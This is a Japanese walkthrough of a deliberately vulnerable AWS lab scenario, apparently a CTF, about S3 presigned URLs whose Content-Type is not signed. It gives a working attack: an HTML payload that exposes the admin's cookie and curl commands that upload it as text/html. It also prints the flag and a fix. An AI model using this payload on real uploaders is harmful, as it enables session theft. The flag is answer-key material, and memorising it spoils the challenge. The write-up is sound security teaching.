# シナリオ 2 - 署名付き URL を用いた任意の HTML ファイルのアップロード

[English](./README.en.md) / [Top](../../README.md)

## 起動

```sh
cdk deploy Scenario2
# または
make start-Scenario2
```

## 概要

このシナリオは、署名付き URL を用いた任意の HTML ファイルのアップロードを模したアプリケーションと管理者がチャレンジの対象となります。チャレンジの最終的な目的は、問い合わせ窓口の先にいる管理者の Cookie を取得することです。

**類似のシナリオ**

- [シナリオ 1 - SDK を用いた任意の HTML ファイルのアップロード](../scenario1/README.md)
- [シナリオ 3 - POST Policy を用いた任意の HTML ファイルのアップロード](../scenario3/README.md)

管理者の動きは、シナリオ 1 同様に"Administrator Operation Mock"が模擬的に行います。管理者は、ユーザーから送られたアプリケーションの URL を閲覧し、その結果を`/delivery`の S3 に保存をします。

![Scenario2 のアーキテクチャ](design.png)

## Solution

ここからは、このシナリオの解決策を説明します。

### 動作の整理

対象となるアプリケーションでは、以下のような動作を行います。

1. User は Application のエンドポイントに対してファイルをアップロードするリクエストを送信します。
2. Application は、リクエストを受け取り、そのファイルを S3 にアップロード可能な署名付き URL を生成します。
   - この際、Application は、UUIDv4 を生成し、その UUIDv4 をファイル名として S3 にアップロード可能な署名付き URL を生成します。
3. User は、その署名付き URL を用いて、ファイルを S3 にアップロードします。
4. S3 は、そのファイルを受け取り、そのファイルを保存します。
5. Application は、そのファイルのファイル名を User に返却します。
6. User は、そのファイル名を用いて、そのファイルを閲覧することが可能です。

### ソースコードの確認

基本的にはシナリオ 1 と同様の実装となっていますが、`getSignedUrl` 関数を用いて、署名付き URL を生成しています。

`cdk/lib/scenario2/application/src/app.ts` の `/api/upload` に実装が行われています。

```typescript
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const allow = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allow.includes(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
```

当該実装を見ていると、API は`contentType` と `length` の 2 つのパラメータを受信し、それらを用いて PutObject 用の署名付き URL を生成し、生成された署名付き URL をレスポンスとして、返却しています。

ただし、この実装には問題があります。それは、`getSignedUrl`関数において、`Content-Type`ヘッダーを署名するためには、`signableHeaders` に `Content-Type` が含める必要があり、署名付き URL を用いて S3 へのアップロードをする際に、`Content-Type` を変更することが可能です。

[参考](https://github.com/aws/aws-sdk-js-v3/blob/9b3fa28ae6bc7bf69f30a0f9e89eac4e058e4793/packages/polly-request-presigner/src/getSignedUrls.ts#L34-L42)

### 攻略の糸口

このチャレンジでは、`getSignedUrl` 関数において、`Content-Type`が、`signableHeaders` に含まれていないことがポイントとなります。

`signableHeaders` に含まれていない場合、署名付き URL を用いて S3 へのアップロードをする際に、`Content-Type` を変更することが可能であり、`text/html` に変更することで、任意の HTML ファイルをアップロードすることが可能です。

大まかな流れはシナリオ 1 と同様です。

以下の HTML ファイルを `xss.html` として保存します。

```html
<!-- xss.html -->
<html>
  <body>
    <script>
      document.getElementsByTagName('body')[0].innerHTML = `${document.cookie.split('=')[1]}`;
    </script>
  </body>
</html>
```

保存した HTML ファイルを用いて、以下のようなコマンドを実行します。

```sh
TARGET_HOST="....."
FILE=xss.html
LENGTH=$(stat -c %s $FILE)
URL=$(curl -X POST https://${TARGET_HOST}/api/upload \
  -H "Content-Type: application/json" \
  -d '{"contentType":"image/png","length":'$LENGTH'}') | jq -r '.url'
curl -X PUT $URL --upload-file $FILE -H "Content-Type: text/html"
```

その後、出力された URL を Report URL に入力することで、管理者の画面で任意の JavaScript を実行することが可能です。
実行後は、`/delivery/{uuid}`の S3 に保存されたファイルを閲覧することで、管理者の Cookie を含んだ HTML ファイルを閲覧することが可能です。

## チャレンジの回答

```
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```

## アップローダーの修正方法

最後に、アップローダーの修正方法を説明します。

`cdk/lib/scenario2/application/src/app.ts` の `/api/upload` に実装が行われています。
これらを修正するためには、`getSignedUrl` 関数において、`signableHeaders` に `Content-Type` を含めるように修正する必要があります。

**Fix : signableHeaders に Content-Type を含める**

```typescript
const url = await getSignedUrl(s3, command, {
  expiresIn: 60 * 60 * 24,
  signableHeaders: ['Content-Type'],
});
```

この修正により、`Content-Type` が `signableHeaders` に含まれるようになり、署名付き URL を用いて S3 へのアップロードをする際に、`Content-Type` を変更することができなくなります。
